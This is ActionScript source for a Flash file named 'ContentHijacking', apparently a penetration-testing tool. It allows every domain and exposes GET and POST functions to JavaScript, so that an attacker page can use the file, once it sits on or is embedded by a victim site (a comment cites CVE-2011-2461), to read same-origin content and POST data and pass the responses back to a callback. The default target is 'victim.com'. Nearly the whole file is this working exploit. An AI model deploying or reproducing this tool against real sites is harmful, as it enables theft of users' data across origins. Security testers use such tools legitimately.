package {
	import flash.net.URLRequestMethod;
	import flash.net.URLVariables;
	import flash.net.URLRequest;
	import flash.net.URLLoader;
	import flash.events.*;
	import flash.text.TextFormatAlign;
	import flash.text.TextFormat;
	import flash.display.SimpleButton;
	import flash.display.StageScaleMode;
	import flash.system.Capabilities;
	import flash.text.TextFieldType;
	import flash.system.Security;
	import flash.external.ExternalInterface;
	import flash.display.Sprite;
	import flash.text.TextField;
	
	/**
	 * @author User
	 */
	public class ContentHijacking extends Sprite {
		
		private var jsCallback:String = "";
		private var loader:URLLoader;
		private var txtTarget:TextField;
		private var txtContent:TextField;
		
		public function ContentHijacking() {
			// Allowing other domains to embed and use this file
		    flash.system.Security.allowDomain("*");
			flash.system.Security.allowInsecureDomain("*");
			// Sharing methods with JavaScript code
			ExternalInterface.addCallback("GETURL",GETURL);
			ExternalInterface.addCallback("POSTURL",POSTURL);
			
			// To fix the size
			try{
				stage.scaleMode = StageScaleMode.NO_SCALE;
			}catch(okerr:Error){
				// nothing! this is useful when embedded inside another flash file like CVE-2011-2461
			}
			// Change the background color
			backgroundColor(0xFFCFF2CD);
			// Informational label at the top of the page
			var lblInfo:TextField = createCustomTextField(200, 0, 300, 22);
            lblInfo.htmlText = "ContentHijacking: Flash";
			
			// Target label
			var lblTarget:TextField = createCustomTextField(10, 25, 50, 22);
            lblTarget.htmlText = "Target:";
			
			// Target input field
			txtTarget = createCustomTextField(60, 25, 400, 22);
            txtTarget.htmlText = "http://victim.com/";
			txtTarget.background = true;
			txtTarget.border = true;
			txtTarget.backgroundColor = 0xFFFFFF;
			txtTarget.type= TextFieldType.INPUT;
			
			// Button to GET the contents!
			var buttonFormat:TextFormat = new TextFormat();
	        buttonFormat.bold = true;
			buttonFormat.align = TextFormatAlign.CENTER;
			
			var txtGETContentButton:TextField = createCustomTextField(10, 65, 150, 22);
			txtGETContentButton.text = "GET Contents!";
			txtGETContentButton.background = true;
			txtGETContentButton.border = true;
			txtGETContentButton.mouseEnabled = false;
			txtGETContentButton.setTextFormat(buttonFormat);
			
			var myButtonSprite:Sprite = new Sprite();
			myButtonSprite.buttonMode = true;
			myButtonSprite.addChild(txtGETContentButton);
			myButtonSprite.addEventListener(MouseEvent.CLICK, GETContents);
			addChild(myButtonSprite);

			// Textarea to show the contents/messages
			txtContent = createCustomTextField(10, 100, 450, 300);
            txtContent.htmlText = "Hello Wolrd from Flash!";
			txtContent.wordWrap = true;
			txtContent.border = true;
			txtContent.background = true;
			txtContent.backgroundColor = 0xFF005A7C;
			txtContent.textColor = 0xFFFFFF;
			txtContent.type= TextFieldType.INPUT;
			
			// Version label at the bottom of the page
			var lblInfo2:TextField = createCustomTextField(200, 400, 300, 22);
            lblInfo2.htmlText = "by Soroush Dalili (@irsdl) - v1.2";
			
			// We need to anounce to the page that the object has been loaded successfuly!
			try{
				ExternalInterface.call("flashLoaded");
			}catch(e:Error){
				trace(e.message);
			}
        }
		
		private function GETContents(e : Event) : void {
			txtContent.text = "";
			loader = new URLLoader();
            configureListeners(loader);
			var target:String = txtTarget.text;
			
            var request:URLRequest = new URLRequest(target);
            try {
                loader.load(request);
            } catch (error:Error) {
                txtContent.text = "Unable to load requested document; Error: " + error.getStackTrace();
            }
			
		}
		
		private function GETURL(jsCallback:String, strURL:String) : void {
			this.jsCallback = jsCallback;
			txtContent.text = "";
			loader = new URLLoader();
            configureListeners(loader);
			var target:String = txtTarget.text = strURL;
			
            var request:URLRequest = new URLRequest(target);
            try {
                loader.load(request);
            } catch (error:Error) {
                txtContent.text = "Unable to load requested document; Error: " + error.getStackTrace();
				if(jsCallback!="")
					ExternalInterface.call(jsCallback, escape(txtContent.text));
            }
			
		}
		
		private function POSTURL(jsCallback:String, strURL:String, strPOSTData:String) : void {
			this.jsCallback = jsCallback;
			txtContent.text = "";
			loader = new URLLoader();
            configureListeners(loader);
			var target:String = txtTarget.text = strURL;
			var variables:URLVariables = new URLVariables(strPOSTData);
            var request:URLRequest = new URLRequest(target);
			request.data = variables;
			request.method = URLRequestMethod.POST;
			
            try {
                loader.load(request);
            } catch (error:Error) {
                txtContent.text = "Unable to load requested document; Error: " + error.getStackTrace();
				if(jsCallback!="")
					ExternalInterface.call(jsCallback, escape(txtContent.text));
            }
			
		}
			
		private function createCustomTextField(x:Number, y:Number, width:Number, height:Number):TextField {
            var result:TextField = new TextField();
            result.x = x;
            result.y = y;
            result.width = width;
            result.height = height;
            addChild(result);
            return result;
        }
		
		private function backgroundColor( color:uint ):void
		 {
		   with( this.graphics )
		   {
		    clear();
		    beginFill( color );
		    drawRect( 0 , 0 , Capabilities.screenResolutionX, Capabilities.screenResolutionY);
		    endFill();
		   }
		 }
		
		private function configureListeners(dispatcher:IEventDispatcher):void {
            dispatcher.addEventListener(Event.COMPLETE, completeHandler);
            dispatcher.addEventListener(Event.OPEN, openHandler);
            dispatcher.addEventListener(ProgressEvent.PROGRESS, progressHandler);
            dispatcher.addEventListener(SecurityErrorEvent.SECURITY_ERROR, securityErrorHandler);
            dispatcher.addEventListener(HTTPStatusEvent.HTTP_STATUS, httpStatusHandler);
            dispatcher.addEventListener(IOErrorEvent.IO_ERROR, ioErrorHandler);
        }
		
		private function completeHandler(event:Event):void {
           //var loader:URLLoader = URLLoader(event.target);
            //trace("completeHandler: " + loader.data);
            
    		//logData("completeHandler: " + loader.data);
			logData("completeHandler: " + event,event);
        }

        private function openHandler(event:Event):void {
            //trace("openHandler: " + event);
			logData("openHandler: " + event,event);
        }

        private function progressHandler(event:ProgressEvent):void {
            //trace("progressHandler loaded:" + event.bytesLoaded + " total: " + event.bytesTotal);
			logData("progressHandler loaded:" + event.bytesLoaded + " total: " + event.bytesTotal,event);
        }

        private function securityErrorHandler(event:SecurityErrorEvent):void {
            //trace("securityErrorHandler: " + event);
			logData("securityErrorHandler: " + event,event);
        }

        private function httpStatusHandler(event:HTTPStatusEvent):void {
            //trace("httpStatusHandler: " + event);
			logData("httpStatusHandler: " + event,event);
        }

        private function ioErrorHandler(event:IOErrorEvent):void {
            //trace("ioErrorHandler: " + event);
			logData("ioErrorHandler: " + event,event);
        }
		
		private function logData(data:String,event:Event):void{
			var contents:String = "";
			try{
				var loader:URLLoader = URLLoader(event.target);
				if(loader.data)
					contents = loader.data;
			}catch(e:Error){
				//
			}

			txtContent.appendText(data+"\r\n" +contents+"\r\n\r\n");
			
			if(jsCallback!=""){
				ExternalInterface.call(jsCallback, escape(data),"1");
				if(contents===""){
					contents = "No content was downloaded!";
					ExternalInterface.call(jsCallback, escape(contents),"1");
				}else{
					ExternalInterface.call(jsCallback, escape(contents),"0");
				}
			}
		}
		
	}
}
//http://stackoverflow.com/questions/7533106/urlloader-how-to-get-the-url-that-was-loaded - TODO